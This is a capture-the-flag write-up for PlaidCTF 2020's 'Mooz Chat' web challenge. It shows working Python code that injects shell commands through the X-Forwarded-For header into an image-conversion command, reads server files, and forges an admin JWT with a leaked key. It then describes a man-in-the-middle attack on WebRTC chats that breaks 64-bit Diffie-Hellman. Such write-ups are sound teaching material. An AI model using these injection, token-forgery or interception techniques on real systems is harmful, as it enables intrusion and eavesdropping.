# [Web] Mooz Chat - 550

We have the site [https://chat.mooz.pwni.ng/](https://chat.mooz.pwni.ng/). We have the binary of the server.  
We have two challenges:  
1. Tom Nook and Isabelle have been exchanging text messages over Mooz recently. Is Tom Nook looking for something besides bells these days?
2. Timmy and Tommy are now using Mooz to manage their store from a safe distance. Thankfully their video chats are end-to-end encrypted so nobody can steal their secrets.

**(A TL;DR is at the bottom)**
## Part 1
The site:  
![Login page](https://raw.githubusercontent.com/koolkdev/ctf-writeups/master/plaid2020/mooz-chat/images/login.png)  
After register/login:  
![Main Page](https://raw.githubusercontent.com/koolkdev/ctf-writeups/master/plaid2020/mooz-chat/images/main.png)  
![Chat](https://raw.githubusercontent.com/koolkdev/ctf-writeups/master/plaid2020/mooz-chat/images/chat.png)  
We can host/join a room.  
We can change the avatar.  
Let's take a look on the binary. The binary doesn't have DWARF symbols, but the symbols can be applied with [IDAGolangHelper](https://github.com/sibears/IDAGolangHelper).  
  
Here are all the handlers:  
```
/api/login => main_handleLogin
/api/register => main_handleRegister
/api/message => main_handleMessage
/api/host/* => main_handleHost
/api/find/* => main_handleFind
/api/join/* => main_handleJoin
/api/profile => main_handleProfile
/api/avatar/* main_handleAvatar
/api/users main_handleAdminUsers
/api/rooms => main_handleAdminRooms
/api/messages => main_handleAdminMessages
```

For our first challenge main_handleAdminMessages is interesting. We can see something compared to 'tomnook', and if it is different,  there is the message:  
"Only available to Tom Nook". So probably only the user 'tomnook' can use the admin APIs.  
  
Another interesting function in the binary is `main_sandboxCmd`, it wraps `os_exec_CommandContext`.  
It is called by `main_getAvatar`, one flow calls to it with:  
`convert -size %dx%d xc:none -bordercolor %s -border 0 -pointsize 32 -font %s -gravity center -draw "text 0,2 %c" png:- | base64 -w0`  
Another flow calls to it with:  
`base64 -d | convert -comment 'uploaded by %s' - -resize %dx%d png:- | base64 -w0`  
That one is interesting, `main_getAvatar` is called by `main_handleProfile` which is for changing profiles. If we try to upload an image as profile we can see a POST request to `/api/profile`, with the payload `{"avatar":"base64 of the image"}`:  
![Avatar request](https://raw.githubusercontent.com/koolkdev/ctf-writeups/master/plaid2020/mooz-chat/images/avatar_request.png)  
We can also see the HTTP header `x-chat-authorization` which contains a JWT (JSON Web Token):  
![jwt](https://raw.githubusercontent.com/koolkdev/ctf-writeups/master/plaid2020/mooz-chat/images/jwt.png)  
It contains my username and IP, probably used for authentication. We get that token when we login.  
So let's focus in the `uploaded by %s`. we can see a call to `main_getIPAddr` :  
![getip](https://raw.githubusercontent.com/koolkdev/ctf-writeups/master/plaid2020/mooz-chat/images/getip.png)  
It uses X-Forwarded-For http header for creating the string. Doesn't seem to do any escaping. Well, let's try to send some request (we need to login and get a token because X-Forwarded-For affect the token which contains our ip):  
```python
url = "https://chat.mooz.pwni.ng/api/login"
headers = {
    "X-Forwarded-For": "aaaa",
}
r=requests.post(url, headers=headers,
            data= '{"username":"a123123","password":"123123"}');

assert r.status_code == 201
token=json.loads(r.text)["token"]

headers = {
    "X-Forwarded-For": "aaaa",
    "x-chat-authorization":token
}
requests.post(url, headers=headers, data= "{\"avatar\":\"iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAQAAAD9CzEMAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfkBBIVAx0cV5RhAAABSElEQVRYw+2TQStEURTHf4NETSyUqJGSYlIWFkoWZmFh87bKrHwDm8dSySilWLHhA1iOsrKwUEYpNSXNQhONSSlNsRg9M7oWTqfJ5j29u9L9vcU979zz/v/7zjsPHA6Hw+H4DyQiVfWxiEeKQZI8U+WRU/I0bB1ihU8MhjcuuSbAYDDcMW5H3hfBPO0ATFCXzANdNgyqIlfWdh5LxpAJf7wtcsUIYxJVdG/UhsGOrAXuJQp0byjcoCO0Yo8rZqhwwhedTDGL94fjRSbNOhd8aPd/rk074h43Ilhigwy7Ng0SHKicL3OUs2mwrGJnmjvUXC5cIOwzLWlU1GhSo2R8g16N0rLOMa25FDAcr0X7LTOzzTw+7zSpSaZJmQbdcQwGePo1mq8skG25P4r3BtDPFkVqBLxwzho9AGS5pU6J1Qi/qsPhcDhi8w319X/WwEB5cgAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyMC0wNC0xOFQyMTowMzoyOSswMDowMBEz25kAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjAtMDQtMThUMjE6MDM6MjkrMDA6MDBgbmMlAAAAAElFTkSuQmCC\"}")
```
  
Now lets download our avatar (/api/avatar/a123123.png):  
![image_hex](https://raw.githubusercontent.com/koolkdev/ctf-writeups/master/plaid2020/mooz-chat/images/image_hex.png)  
  
Looks good. So we can just inject a command, and the stdout will be as our avater file. (we even get it as response to /api/profile)  
  
So now lets send more interesting header:  
```python
def run_command(command):
    url = "https://chat.mooz.pwni.ng/api/login"
    headers = {
        "X-Forwarded-For": "1.1.1.1' | echo $(%s | base64 -w0) MAGICMAGIC '" % command,
    }
    r=requests.post(url, headers=headers,
                data= '{"username":"a123123","password":"123123"}');

    assert r.status_code == 201
    token=json.loads(r.text)["token"]

    headers = {
        "X-Forwarded-For": "1.1.1.1' | echo $(%s | base64 -w0) MAGICMAGIC '" % command,
        "x-chat-authorization":token
    }
    r=requests.post(url, headers=headers,
                data= "{\"avatar\":\"iVBORw0KGgoAAAANSUhEUgAAADAAAAAwCAQAAAD9CzEMAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAAAAmJLR0QA/4ePzL8AAAAHdElNRQfkBBIVAx0cV5RhAAABSElEQVRYw+2TQStEURTHf4NETSyUqJGSYlIWFkoWZmFh87bKrHwDm8dSySilWLHhA1iOsrKwUEYpNSXNQhONSSlNsRg9M7oWTqfJ5j29u9L9vcU979zz/v/7zjsPHA6Hw+H4DyQiVfWxiEeKQZI8U+WRU/I0bB1ihU8MhjcuuSbAYDDcMW5H3hfBPO0ATFCXzANdNgyqIlfWdh5LxpAJf7wtcsUIYxJVdG/UhsGOrAXuJQp0byjcoCO0Yo8rZqhwwhedTDGL94fjRSbNOhd8aPd/rk074h43Ilhigwy7Ng0SHKicL3OUs2mwrGJnmjvUXC5cIOwzLWlU1GhSo2R8g16N0rLOMa25FDAcr0X7LTOzzTw+7zSpSaZJmQbdcQwGePo1mq8skG25P4r3BtDPFkVqBLxwzho9AGS5pU6J1Qi/qsPhcDhi8w319X/WwEB5cgAAACV0RVh0ZGF0ZTpjcmVhdGUAMjAyMC0wNC0xOFQyMTowMzoyOSswMDowMBEz25kAAAAldEVYdGRhdGU6bW9kaWZ5ADIwMjAtMDQtMThUMjE6MDM6MjkrMDA6MDBgbmMlAAAAAElFTkSuQmCC\"}")

    assert r.status_code == 200
    return base64.b64decode(base64.b64decode(json.loads(r.text)["avatar"]).split(b"MAGICMAGIC")[0])
```
```
>>> print(run_command("ls").decode()) 
bin
boot
dev
etc
home
lib
lib64
media
mnt
opt
proc
root
run
sbin
srv
start.sh
sys
tmp
usr
var
```
  
Let's try another command:  
```python
>>> print(run_command("ps").decode())
```
```console
  PID TTY      STAT   TIME COMMAND
    1 ?        SNs    0:00 /bin/sh -c base64 -d | convert -comment 'uploaded by 1.1.1.1' | echo $(ps ax | base64 -w0) MAGICMAGIC ', 89.xxxxxxxxx' - -resize 48x48 png:- | base64 -w0
    4 ?        SN     0:00 /bin/sh -c base64 -d | convert -comment 'uploaded by 1.1.1.1' | echo $(ps ax | base64 -w0) MAGICMAGIC ', 89.xxxxxxxxx' - -resize 48x48 png:- | base64 -w0
    5 ?        SN     0:00 base64 -w0
    6 ?        SN     0:00 /bin/sh -c base64 -d | convert -comment 'uploaded by 1.1.1.1' | echo $(ps ax | base64 -w0) MAGICMAGIC ', 89.xxxxxxxxx' - -resize 48x48 png:- | base64 -w0
    7 ?        RN     0:00 ps ax
    8 ?        RN     0:00 /bin/sh -c base64 -d | convert -comment 'uploaded by 1.1.1.1' | echo $(ps ax | base64 -w0) MAGICMAGIC ', 89.xxxxxxxxx' - -resize 48x48 png:- | base64 -w0
```
So it looks like we are running in some kind of a jail.  
  
So back to the output of the `ls`. There is one interesting file: `start.sh`. Let's read it: (I am reading it in chunks because it fails if the output of our command is too big)  
```python
def read_file(file_name):
    d = b''
    index = 0
    while True:
        dd = run_command("dd if=%s bs=1 count=4096 skip=%d" % (file_name, index))
        if not dd:
            return d
        d += dd
        index += 4096
```
```python
>>> print(read_file("start.sh").decode())
```
```sh
#!/bin/bash
nginx

nsjail -u mongodb -g mongodb -t 0 -d -v -l /var/log/nsjail.mongodb.log \
--rlimit_as max \
--rlimit_core 0 \
--rlimit_cpu max \
--rlimit_fsize max \
--rlimit_nofile max \
--rlimit_nproc max \
--rlimit_stack max \
--disable_clone_newnet \
--disable_clone_newuser \
--disable_clone_newns \
--disable_clone_newpid \
--disable_clone_newipc \
--disable_clone_newuts \
--disable_clone_newcgroup \
-- /usr/bin/mongod --config /etc/mongod.conf --replSet rs0

sleep 10
/usr/bin/mongo --eval 'rs.initiate()'
sleep 5
/usr/bin/mongo chat --eval 'db.users.insertOne({"username":"tomnook","password":"$2a$10$V7..P7hE.0ga.T3PStuhsOYjFVV9ihXYfTBENzVoaiTf76C9quPuO","avatar":<reducted>})'

export JWT_KEY="Pl4idC7F2020"
nsjail -Me -e -u nobody -g nogroup -t 0 -d -v -l /var/log/nsjail.api.log \
--rlimit_as max \
--rlimit_core 0 \
--rlimit_cpu max \
--rlimit_fsize max \
--rlimit_nofile max \
--rlimit_nproc max \
--rlimit_stack max \
--disable_clone_newnet \
--disable_clone_newuser \
--disable_clone_newns \
--disable_clone_newpid \
--disable_clone_newipc \
--disable_clone_newuts \
--disable_clone_newcgroup \
-- /usr/local/sbin/pctf-video-chat

tail -f /var/log/nsjail.api.log -f /var/log/nginx/error.log -f /var/log/nsjail.mongodb.log
```
  
We can see that it creates the username 'tomnook', we can also see that `export JWT_KEY="Pl4idC7F2020"`  
We have the JWT key! So we can now login as tomnook and get the messages:  
```python
token = {'ipaddr': MY_IP, 'username': 'tomnook'}

url = "https://chat.mooz.pwni.ng/api/messages"
headers = {
    "x-chat-authorization": jwt.encode(token, "Pl4idC7F2020"),
}
r=requests.get(url, headers=headers);
assert r.status_code == 200
print(json.loads(r.text))
```
```
[...., {'to': 'tomnook', 'from': 'isabelle', 'data': 'pctf{aModestSumOfShells}'}]
```
  
Success!!  
  
## Part 2
Now when we can log in as the admin, let's get the list of the rooms from /api/rooms:  
```json
[{"_id": "000000000000000000000000", "host": "timmy_fc87dfa4", "room": "shop_c0ddd565"}, {"_id": "000000000000000000000000", "host": "timmy_446c2ede", "room": "shop_9415eba1"}]
```
We can see that timmy is always creating room, each time with a different user. The rooms probably disappear when tommy is joining them.  
  
Let's try to join the room ourself before tommy:  
![Encryption fail](https://raw.githubusercontent.com/koolkdev/ctf-writeups/master/plaid2020/mooz-chat/images/encryption_fail.png)  
  
So let's take a look how joining/hosting rooms works:  
```javascript
async chatHost(room, password) {
    this.chatReset()
    try {
        this.connection = await this.createPeerConnection()
        this.channel = this.createDataChannel(this.connection)
        const offer = await this.connection.createOffer()
        await this.connection.setLocalDescription(offer)
        const data = await this.api.host(room, offer)
        this.room = data.room
        this.peer = data.username
        this.packetizer = this.newPacketizer(true, password || '')
        await this.connection.setRemoteDescription(data.answer)
        this.connected = true
        this.sendPendingCandidates()
        this.processPeerCandidates()
    } catch (e) {
        this.chatReset()
        console.log(e)
        return false
    }
    return true
}

async chatJoin(room, password) {
    this.chatReset()
    const data = await this.api.find(room)
    this.connection = await this.createPeerConnection()
    try {
        this.channel = this.createDataChannel(this.connection)
        this.room = data.room
        this.peer = data.username
        this.packetizer = this.newPacketizer(false, password || '')
        await this.connection.setRemoteDescription(data.offer)
        const answer = await this.connection.createAnswer()
        await this.connection.setLocalDescription(answer)
        await this.api.join(this.room, answer)
        this.connected = true
        this.sendPendingCandidates()
        this.processPeerCandidates()
    } catch (e) {
        this.chatReset()
        console.log(e)
        return false
    }
    return true
}
```
It creates a WebRTC connection, and send the ICE candidates to the other user with /api/message. (The same way regular messages are sent, just with a different message type). Those ice candidates are used to create the peer to peer conections.  
When we connected to the room with timmy, we got such messages from /api/message:  
```json
[{"to":"a123123","from":"timmy_eb0e6172","type":"ice","data":"{\"candidate\":\"candidate:1876313031 1 tcp 1518091519 ::1 34945 typ host tcptype passive generation 0 ufrag 83oP network-id 5\",\"sdpMid\":\"0\",\"sdpMLineIndex\":0,\"foundation\":\"1876313031\",\"component\":\"rtp\",\"priority\":1518091519,\"address\":\"::1\",\"protocol\":\"tcp\",\"port\":34945,\"type\":\"host\",\"tcpType\":\"passive\",\"relatedAddress\":null,\"relatedPort\":null,\"usernameFragment\":\"83oP\"}"}]
 ```
And our browser sent similar messages to timmy.  
Now after the data channel is set, this is how messages are handled:  
```javascript
const wasReady = this.packetizer.isReady()
const ptr = Module._malloc(e.data.byteLength)
Module.HEAP8.set(new Uint8Array(e.data), ptr)
this.packetizer.processData(ptr, e.data.byteLength)
Module._free(ptr)

this.flushPacketizer()
if (this.packetizer) {
    if (this.packetizer.isReady() && !wasReady) {
        this.currentPeer = this.peer
        if (this.options.onPeerConnected) {
            this.options.onPeerConnected()
        }
    }
    
    const dataType = this.packetizer.getDataType()
    if (dataType >= 0) {
        const dataPtr = this.packetizer.getData()
        const dataSize = this.packetizer.getDataSize()
        const data = new Uint8Array(Module.HEAP8.slice(dataPtr, dataPtr + dataSize))

        switch (dataType) {
        case 0:
            if (this.options.onVideoData) {
                this.options.onVideoData(data)
            }
            break
        case 1:
            if (this.options.onSecureMessage) {
                const decoder = new TextDecoder()
                this.options.onSecureMessage(this.peer, decoder.decode(data))
            }
            break
        case 255:
            this.disconnectPeer()
            break
        default:
            console.error(`Unknown peer message: type=${dataType}, data=${data}`)
            break
        }
    }
}
```
The interesting part:  
```javascript
this.packetizer.processData(ptr, e.data.byteLength)
// ...
const dataType = this.packetizer.getDataType()
const dataPtr = this.packetizer.getData()
const dataSize = this.packetizer.getDataSize()
```
So what is this packetizer? It is implemented in webassembly.wasm, and has those functions:  
```
Connection(host, nonce, password, seed, seed_size) // the constructor
processData(self, data, size)
sendData(self, type, data, size)
isRead(self)
isError(self)
getOutput(self)
consumeOutput(self)
getData(self)
getDataSize(self)
getDataType(self)
```
This is how it is initialized:  
```javascript
newPacketizer(hosting, password) {
    const rand = new Uint8Array(64)
    this.options.getRandomValues(rand)
    const randPtr = Module._malloc(rand.byteLength)
    Module.HEAP8.set(rand, randPtr)
    const nonce = hosting ? this.api.username + "\n" + this.peer : this.peer + "\n" + this.api.username
    const packetizer = new Module.Connection(hosting, nonce, password, randPtr, rand.byteLength)
    Module._free(randPtr)
    return packetizer
}
```
So it is initalized with the nonce `<hosting username>\n<peer username>`, with the password and with a random seed.
  
So now it is time for some reverse engineering.  
Here is some pseudo code:  
```C
Connection::Connection(...) {
    this->state = 0;
    RAND_seed(seed, seed_size);
    AES_set_encrypt_key(128, SHA1(password)[:16], nonce_encryptor);
    AES_encrypt(nonce, this->encrypted_nonce, nonce_encryptor);
    AES_encrypt(nonce+16, this->encrypted_nonce+16, nonce_encryptor);
    Connection::setup(this);
}

Connection::setup() {
    if (hosting) {
        // Create the first packet
        dh = DH_new();
        DH_generate_parameters_ex(dh, 64, 2, 0);
        dh_param_length = i2d_DHparams(dh, dh_param);
        DH_generate_key(dh);
        dh_pub_key = DH_get_pub_key(dh);
        write_byte_to_packet(0);
        write_word_to_packet(dh_param_length);
        write_bytes_to_packet(dh_param, dh_param_length);
        dh_pub_key_bits = BN_num_bits(dh_pub_key);
        write_word_to_packet((dh_pub_key_bits+7)/8);
        write_bytes_to_packet(dh_pub_key, (dh_pub_key_bits+7)/8);
    }
}

Connection::processData(this, data, data_length) {
    packet_state = read_byte_from_packet();
    // check that packet_state == this->state
    switch (packet_state) {
    case 0: // initialize connection
        if (hosting) {
            // ...
        }
        else {
            // loads the dh params from packet
            DH_generate_key(dh);
            dh_pub_key = DH_get_pub_key(dh);
            write_byte_to_packet(0);
            dh_pub_key_bits = BN_num_bits(dh_pub_key);
            write_word_to_packet((dh_pub_key_bits+7)/8);
            write_bytes_to_packet(dh_pub_key, (dh_pub_key_bits+7)/8);
            DH_compute_key(shared_key, other_pub_key, dh); // 8 bytes
            key = SHA1("0123425234234fsdfsdr3242" + shared_key)[:16];
            AES_set_encrypt_key(128, key, this->send_encryptor);
            AES_set_decrypt_key(128, key, this->recv_decryptor);
            AES_encrypt(this->encrypted_nonce, encrypted_nonce, this->send_encryptor);
            write_bytes_to_packet(encrypted_nonce, 32);
            this->state = 1;
        }
        break;
    case 1:
        // not interseting, basically change to state to 2
        ...
    case 2: // connection ready
        this->data_type = read_byte_from_packet();
        this->data_len = read_word_from_packet();
        // decrypt the data with this->recv_decryptor
    }
}
```

### The protocol:
**Host -> Client**:  
```
BYTE - state - 0
WORD - DH parameters length
BYTE[] - DH parameters
WORD - DH public key length
BYTE[] - DH public key (for the connection key)
```
**Client-> Host**:  
```
BYTE - state - 0
WORD - DH public key length
BYTE[] - DH public key (for the connection key)
BYTE[32] - encrypted nocne (with password and the connection key)
```
**Host->Clinet**:  
```
BYTE - state - 1
```
  
Now for the data:  
```
BYTE - state - 2
BYTE - data type (0 - video data, 1 - text message, 255 - disconnect)
WORD - data length
BYTE[] - data encrypted with the connection key
```
  
So to summarize it, the connection negotiates an AES key using 64 bits Diffie-Hellman. Then the client sends to the host the nonce which is encrypted with both the connection key and the password.
  
So the host basically verifies that the client has the password, it is impossible to connect without it.  
But - 64 bit DH is too weak. If we can get the traffic between timmy and tommy, we can crack and decrypt the video. Since we can impersonate any user (like we did in the first part), we can do it.  
  
# The plan - Man in the Middle
1. Find the room that Timmy opened with `/api/rooms`
2. Join the room as Tommy (`/api/join/<room_name>`), establish the WebRTC connection with Timmy.
3. Host a room as Timmy with the same room name (`/api/host/<room_name>`), wait for Tommy to join, and establish the WebRTC connection with him.
4. Transfer and capture the traffic between them.
5. Crack the DH keys.
6. Decrypt the traffic.
7. ???
8. Profit

Notice that we need that both of the rooms will have the same nonce, and the nonce is the username of the host and the client. So we need to use the exact same username as Timmy and Tommy. It isn't an issue since Timmy and Tommy use the same random postfix (So if the username of Timmy is `timmy_fc87dfa4`, the username that Tommy will use is `tommy_fc87dfa4`).  
I used the python library [aiortc](https://github.com/aiortc/aiortc) to implement the MITM code.  
### The script
It is a little bit ugly, but it works: [mitm.py](https://github.com/koolkdev/ctf-writeups/blob/master/plaid2020/mooz-chat/mitm.py)  
The main logic:  
```python

rooms = get_rooms()
if rooms[0]['host'].startswith("timmy_"):
    print("join room %s" % rooms[0]['host'])
    channel_1 = join_room(rooms[0]['room'], rooms[0]['host'].replace("timmy","tommy"))
    channel_2 = host_room(rooms[0]['room'], rooms[0]['host']) 
    while True:
        if not channel_1.queue.empty():
            m = channel_1.recv()
            print("H: %s" % codecs.encode(m, "hex"))
            channel_2.send(m)
        if not channel_2.queue.empty():
            m = channel_2.recv()
            print("C: %s" % codecs.encode(m, "hex"))
            channel_1.send(m)
        run(asyncio.sleep(0.1))
```
  
After running the script, I got the traffic:  
```
H: b'000010300e020900f142e55f240288a302010200083255cf918dd81e89'
C: b'00000875781b2554f4927fbaca5f08511f02c37ccef8515ff78c4f6b551247e6bb13841792d6b386b1f3a0'
H: b'01'
H: b'020001b2e091a81789b94c2515cabd51d2675ab2d44caf684aba48a6d2bdace8c565169f2d8eb0d554a5dae710b1af3fadad9fa3c2f615fe284df33fc2a14d5c108eb91e5242a4fb792ce055a4db9241fac569243186d1c603418c4898797bda7b3132d01fd06a8888d47f0107986cbcceeaf801461d3b9c074fc2900b208a851bd096b245469f58f82624ddc828537f4db915ab45469f58f82624ddc828537f4db915ab45469f58f82624ddc828537f4db915abefa493c12ebbaf9dd1cd486b6b2cd28438daaae613c5fef4354192282a40af1cee376b67fdacd8bbb7dc0e69ecd64005ae39dc0bea26414e038e654625ea1087429ec256c152c5c6204ac1d07c1972da622710b3d765c8ac48cd2e3e74f4bdad093c1d0800be79802773c355520f2687845943f3057c3a37aa29c9c1d4ecc6075db9ab38423559f13534f33d46567aca73cc0c84819a8112e86bf8064f6811dd3055e78c944ab1c77b0c82c2a90785d3697d436abadc7a7e103237253446436deee1f605dcf89d423629ab65634817b48aed151d4797806b7fa127a8e8a01541de5625bc6ab4248ae6c018995bcf4d66e872a21a207625af3014370d2d00f931c817b4cd5591fa5a1fc9228e42bf5762'
H: b'02000116bc9b16babb742a3fbbec257594f8720f50e4ffb5c483df8fb7d45ebb7295624272f671ede8e456e0cae1e2f5142286259c6035912b9f3f49a0df92f63ce3343c6369d635143a682acd5f82447ae0a31dce7aaae67c459a9950dbd7176e9c55f4b2a09b0c559ceadff3e5f9e1794898ff0ec4e83a8b083b056408e4680ff2d875beb857969dec9eac39b9735e84c62623c407ff01bb5465ca4e97263a07a6d29ceefd8c89c1f00ad2ee781217a3862e21ccf87d16fb1fe1a09ff67d2f113ecc1b68ea016bcd96cdd089f29152e81e6c52721b1259ae4d6039a4ac6da01ad774860bf15786bdd13153ee527b9d035d14b5d63f75567187d2e682228f3ddeb8f4ac1924371d5c94a5d8675d169e0cd048e132d4fe4421f4a70c8a7529b843d9171a'
H: b'020001163d7825b385bacb33ee587fcb44452852dba955fe66bc42d84a3a2b36930748100e6a35335e9e9aa1623c8538595fd364faf19e9266c7bd2419f9f483da080bfa14ed1ee409b7e3265d413b66715997fe08cb8629e7af52fac0fd0041653aa15e6e6f971f3c2c588f1c4befb908d8a2c0fae62ccf14cf218e3b8bcc752393eb64dcafec343fcfd4a311494bcd87cb69327ad6b0578728bf7209736697f262f18b71b665fb922613e8e7d1b21a378b2d202f1083a93cea04cc08d2aa1dda976322768ab171eaf2de4fb856cef6c7a44347aa2c9a472bd7fa95aab173aa25b18ff8f26f54bc959d84c8e826000dcf62ff407bf14e028772d60cd10221ab93220796b340aa3db3669257e1008d2b0c8be40f254ca0e619ceb18529827275e886562c'
H: b'020001169dc5601fbe8ecf24aab04e02a4b5832601b106546e94d5b575e180a7e59574345167f8702b6c338b33e66b2255700f86b6e0830b8421bff77ceafa0a782e892a6013bce26fa7899b572e01e094383a5d66f4c4f9b7dcf0b7d7453df973b5e9fcafcf310d69ac3dc0c9a7f54c186cf6ae3e6b94499d9993948ced4f9c32c49760820cbc07fa5f0bb7fd5b8a43d0dc5a946053eb58f74263eb66d1f5ce34976bf41374d235598d0a661b0511f517ace2993fb3ce81b781a58a2229ebbeaa923874d695578af5bff48807662cc4b8c98a7f4cfea81fd4338e9a461d3612b11a4a74a6c1b18e7f95b98dfab8e65eedfde3f1547daefc4e319f2f4b33d646bc7bfdc18271c03554197d78d3c424177031e86f55ebdc2f258c489bfca188661f6f2bfd'
....
```
  
So the parameters of the DH are:  
```
g=2  
p=17384709708392335523  
gx=3627033298973761161  
q=8692354854196167761
```
  
```
gy = 8464545346795901567
```
using GNFS program we can get: (I created connection until I got parameters that the program could crack)  
```
x=5286236525714760900
y=5980053691502474284
```
Success!  
So the shared key is: `7c35faf0dad285c9`  
Let's try to decrypt the first packet:  
```python
AES.new(hashlib.sha1(b"0123425234234fsdfsdr3242" + codecs.decode("7c35faf0dad285c9", "hex")).digest()[:16]).decrypt(codecs.decode("e091a81789b94c2515cabd51d2675ab2d44caf684aba48a6d2bdace8c565169f2d8eb0d554a5dae710b1af3fadad9fa3c2f615fe284df33fc2a14d5c108eb91e5242a4fb792ce055a4db9241fac569243186d1c603418c4898797bda7b3132d01fd06a8888d47f0107986cbcceeaf801461d3b9c074fc2900b208a851bd096b245469f58f82624ddc828537f4db915ab45469f58f82624ddc828537f4db915ab45469f58f82624ddc828537f4db915abefa493c12ebbaf9dd1cd486b6b2cd28438daaae613c5fef4354192282a40af1cee376b67fdacd8bbb7dc0e69ecd64005ae39dc0bea26414e038e654625ea1087429ec256c152c5c6204ac1d07c1972da622710b3d765c8ac48cd2e3e74f4bdad093c1d0800be79802773c355520f2687845943f3057c3a37aa29c9c1d4ecc6075db9ab38423559f13534f33d46567aca73cc0c84819a8112e86bf8064f6811dd3055e78c944ab1c77b0c82c2a90785d3697d436abadc7a7e103237253446436deee1f605dcf89d423629ab65634817b48aed151d4797806b7fa127a8e8a01541de5625bc6ab4248ae6c018995bcf4d66e872a21a207625af3014370d2d00f931c817b4cd5591fa5a1fc9228e42bf5762", "hex"))
```
![decrypt](https://raw.githubusercontent.com/koolkdev/ctf-writeups/master/plaid2020/mooz-chat/images/decrypt.png)  
Looks good!

So let's decrypt everything:
```python
data = b''
aes = AES.new(hashlib.sha1(b"0123425234234fsdfsdr3242" + codecs.decode("7c35faf0dad285c9", "hex")).digest()[:16])
for packet in packets:
    state = packet[0]
    if state != 2:
        continue
    ptype, length = struct.unpack(">BH", packet[1:4])
    data += aes.decrypt(packet[4:])[:length]
open("video.webm", "wb").write(data)
```
![flag](https://raw.githubusercontent.com/koolkdev/ctf-writeups/master/plaid2020/mooz-chat/images/flag.png)  
  
Success!  
  
## TL;DR:
**Part 1** - Shell injection, find the JWT key, login as the admin.  
**Part 2** - MITM for getting the encrypted traffic + weak encryption allows us to decrypt it (64 bit Diffie-Hellman) 

